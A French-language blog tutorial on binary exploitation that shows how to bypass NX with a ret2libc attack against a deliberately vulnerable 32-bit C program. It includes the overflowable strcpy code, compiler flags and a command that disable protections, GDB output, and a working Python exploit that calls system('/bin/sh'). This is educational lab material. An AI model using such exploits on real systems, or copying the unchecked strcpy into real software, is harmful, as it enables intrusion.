---
title: "Bypass NX avec ret2libc sur un binaire x86"
date: "2019-04-01"
description: "Continuons notre série sur les exploitations de binaires avec une technique permettant de passer outre une protection : NX"
categories:
  - "exploit"
  - "tutos"
image: "/medias/articles/bypass-nx-ret2libc-binaire-x86/images.jpeg"
---

Continuons notre série sur les exploitations de binaires avec une technique permettant de passer outre une protection : NX

## Etude de la protection

NX, permet de sécuriser certains emplacements mémoire en les rendant non exécutables, par exemple la stack ou encore le heap.  
Dans notre premier exploit, nous avons utilisé la stack pour stocker et exécuter notre shellcode. Cependant, nous contrôlons toujours EIP !

### Mise en place

Pour cet exemple, j’utilise une machine Ubuntu 14.04 à jour. Un serveur SSH ainsi que GDB Peda et Python sont installés sur la machine. J’utiliserais aussi Metasploit directement sur ma machine.
Le code que nous allons exploiter est le suivant :

```
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char\*\* argv) {
  char buffer\[20\];
  strcpy(buffer, argv\[1\]);
  printf("%s\\n",buffer); return 0; }
```

Pour la compilation, nous utiliserons la ligne de commande suivante :

`gcc exploitme.c -o exploitme -fno-stack-protector -m32`

Enfin, nous allons désactiver l’ASLR ( commande à exécuter en root ) :

`sudo echo 0 > /proc/sys/kernel/randomize_va_space`

### Vulnérabilités

Comme [précédemment](https://shoxxdj.fr/articles/exploitation-binaire-x86-sans-protections/), nous remarquons la présence d'un strcpy. Nous pouvons vérifier alors que le programme "crash", lorsqu'un nombre de données trop importantes est envoyé :

![Le programme "crash"](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-12.png)

Nous avons bien un "_Segfault_" A noter que l'affichage s'effectue, ainsi la fonction _printf_ est bien exécutée. Vérifions alors avec gdb :

![](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-2-1024x828.png)

Nous pouvons remarquer que GDB crash à l'adresse de l'instruction _ret._ En s’intéressant au fonctionnement de celle ci, nous pouvons remarquer que _ret_ est un alias pour : _pop eip_. Si vos notions d'assembleurs se retrouvent limités ici, sachez à minima que _pop_ permet de déplacer la valeur stockée en haut de la pile dans le registre passé en argument. Ainsi, _ret_ ou _pop eip_ demandent tout deux le placement de la valeur du registre ESP dans le registre EIP.

### Compilation

Lors de l’étape de mise en place, je vous ai demandé de compiler le code avec un certain nombre d’arguments passés au compilateur :

- \-m32 : Permet de compiler le binaire en 32bits sur une machine 64bits ( nécéssite gcc-multilib).

- \-fno-stack-protector : Permet de désactiver les [protections sur la stack](https://www.rapid7.com/resources/mitigating-buffer-overflow-attacks-with-stack-cookies/)

Comme nous l’indique ces options, seul NX est en place . Cela peut se vérifier avec les commandes _checksec_ et _aslr_ de peda :

![Seul NX est activé](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-3.png)

## Exploitation

A nouveau, notre objectif est d'obtenir un shell /bin/sh depuis ce binaire.

### Trouver EIP

Nous utilisons encore une fois les patterns de metasploit :

```
./pattern\_create.rb -l 3000
./pattern\_offset.rb -l 3000 -q 0x31624130
[*] Exact match at offset 32
```

Nous avons à présent l'adresse d'EIP.

### Préparation de l'exploit

La commande _vmmap_ de Peda permet de connaitre les adresses des sections, ainsi que les droits de ces dernières :

```
gdb-peda$ vmmap Start End Perm Name 0x56555000 0x56556000 r-xp
/home/user/x86\_02/exploitme 0x56556000 0x56557000 r--p
/home/user/x86\_02/exploitme 0x56557000 0x56558000 rw-p
/home/user/x86\_02/exploitme 0x56558000 0x5657a000 rw-p
\[heap\]
0xf7ded000 0xf7fbf000 r-xp /lib32/libc-2.27.so
0xf7fbf000 0xf7fc0000 ---p /lib32/libc-2.27.so
0xf7fc0000 0xf7fc2000 r--p /lib32/libc-2.27.so
0xf7fc2000 0xf7fc3000 rw-p /lib32/libc-2.27.so
0xf7fc3000 0xf7fc6000 rw-p mapped
0xf7fcf000 0xf7fd1000 rw-p mapped
0xf7fd1000 0xf7fd4000 r--p
\[vvar\] 0xf7fd4000 0xf7fd6000 r-xp
\[vdso\] 0xf7fd6000 0xf7ffc000 r-xp /lib32/ld-2.27.so
0xf7ffc000 0xf7ffd000 r--p /lib32/ld-2.27.so
0xf7ffd000 0xf7ffe000 rw-p /lib32/ld-2.27.so
0xfffdd000 0xffffe000 rw-p
\[stack\]
```

Nous constatons bien que la stack est non exécutable, cependant, nous pouvons remarquer la présence de la libc dans le programme. Sans elle, _strcpy_ et _printf_ ne fonctionneraient pas.

La libc embarque un bon nombre de fonctions, parmi elles, _[system.](http://man7.org/linux/man-pages/man3/system.3.html)_ Cette dernière permet l’exécution de commandes systèmes. Comme la majorité des fonctions elle utilise plusieurs arguments :

- Une adresse de retour
- La commande à exécuter

#### Trouver l'adresse de la fonction system

Pour trouver l'adresse de system, nous allons ici utiliser Peda. Il existe cependant d'autres techniques qui seront à utiliser notamment lorsque vous n'avez pas la main sur la machine.

En utilisant la commande _print,_ ou son alias _p_ suivit du nom de la fonction, Peda nous donne l'adresse :

![Adresse de la fonction System](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-4.png)

#### Trouver l'adresse de retour

Les conventions d'appels des fonctions sont telles, qu'une fonction doit intégrer l'adresse de la prochaine instruction à exécuter une fois celle ci terminée. C'est exactement ce qu'il se passe lors du _ret._

Pour cet exploit, nous n'auront pas besoin d'adresse en particulier, mais retenez ce principe il nous servira plus tard.

#### Trouver la chaine "/bin/sh"

Dernière étape de la préparation de notre exploit, trouver la chaine "/bin/sh", qui correspond à la commande qui sera exécutée par _System_. Pour cela, nous allons encore utiliser Peda :

![Adresse de la chaine '/bin/sh'](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-5.png)

Peda nous indique à quel endroit se trouve notre chaine, comme vous pouvez le constater il s'agit d'une adresse de la libc.

### Exploitation dans GDB

Nous avons tout les éléments nécessaires à la création de notre exploit; il faut à présent les enchaîner correctement :

- Tout d'abord, il faut provoquer l'overflow
- Ajouter l’adresse de system
- Ajouter l'adresse de retour
- Ajouter l'adresse de la chaine '_/bin/sh_'

Oui mais ou les ajouter ? Et bien sur la stack. En 32 bits, les arguments des fonctions sont passés directement sur la pile ( contrairement au 64bits ou ils se placent dans des registres) .

![Exploitation dans GDB](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-6-1024x79.png)

### Exploitation hors de GDB

Etant donné qu'il n'a pas d'ASLR, les adresses de la LIBC seront toujours les mêmes :

![Les adresses de la libc sont toujours identiques](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-7.png)

Nous pouvons alors reprendre notre exploit précédant et l'utiliser directement :

```
from subprocess import call
from struct import pack

system=0xf7e60e70
binsh=0xf7f80fcc

payload = "a"\*32
payload += pack('<I',system)
payload += pack('<I',0xdeadbeef)
payload += pack('<I',binsh)

call(\['./exploitme',payload\])
```

![Exploitation hors de GDB](/medias/articles/bypass-nx-ret2libc-binaire-x86/image-8-1024x77.png)

## Conclusion

Nous avons ici réussi à exploiter notre premier binaire compilé avec la protection NX.
Ce qui nous permet également de nous approcher petit à petit des techniques de ROP.
En effet, nous avons ici exploité le binaire à partir de ses mécanismes internes (libc).
